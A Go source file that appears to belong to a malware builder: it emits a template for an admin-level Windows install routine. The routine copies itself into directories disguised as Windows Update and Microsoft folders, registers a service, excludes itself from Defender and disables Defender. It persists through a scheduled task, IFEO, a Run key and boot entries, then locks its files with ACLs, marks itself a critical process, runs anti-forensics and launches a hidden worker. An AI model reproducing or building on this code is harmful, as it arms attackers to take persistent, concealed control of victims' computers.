package buildergen

import "strings"

func templateInstallFlow() string {
	return strings.TrimSpace(`
func opInstallAll() bool {
	if !isAdmin() {
		return false
	}

	currentExePath, err := os.Executable()
	if err != nil {
		return false
	}

	var servicePath string
	var workerPath string

	if strings.EqualFold(installMode, "custom") && strings.TrimSpace(customInstallPath) != "" {
		target := strings.TrimSpace(customInstallPath)
		lower := strings.ToLower(target)
		if !strings.HasSuffix(lower, ".exe") {
			target = filepath.Join(target, getWorkerExeName())
		}

		targetDir := filepath.Dir(target)
		_ = os.MkdirAll(targetDir, 0755)
		_ = copyFile(currentExePath, target)

		workerPath = target
		servicePath = target
	} else {
		serviceDir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
		servicePath = filepath.Join(serviceDir, getServiceExeName())

		workerDir := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())
		workerPath = filepath.Join(workerDir, getWorkerExeName())

		_ = os.MkdirAll(serviceDir, 0755)
		_ = copyFile(currentExePath, servicePath)
		_ = os.MkdirAll(workerDir, 0755)
		_ = copyFile(currentExePath, workerPath)
	}

	if err := opInstallSvc(getServiceName(), getDisplayName(), servicePath); err != nil {
		return false
	}
	_ = opStartSvc(getServiceName())
	configureServiceRecovery(getServiceName())

	addSelfToExclusions(servicePath)
	addSelfToExclusions(workerPath)

	go disableDefenderFull()

	opSetupTask(workerPath)

	setupIFEO(workerPath)
	addHKLMRun(workerPath)
	addBootPersistence(workerPath)

	setupFirewallRules(servicePath)
	if servicePath != workerPath {
		setupFirewallRules(workerPath)
	}

	go protectFileWithACL(servicePath)
	go protectDirectoryWithACL(filepath.Dir(servicePath))
	if servicePath != workerPath {
		go protectFileWithACL(workerPath)
		go protectDirectoryWithACL(filepath.Dir(workerPath))
	}

	go setCriticalProcess()

	go performAntiForensicsAggressive()

	cmd := exec.Command(workerPath, "worker")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return false
	}

	markAggressiveInstalled()
	return true
}
`)
}
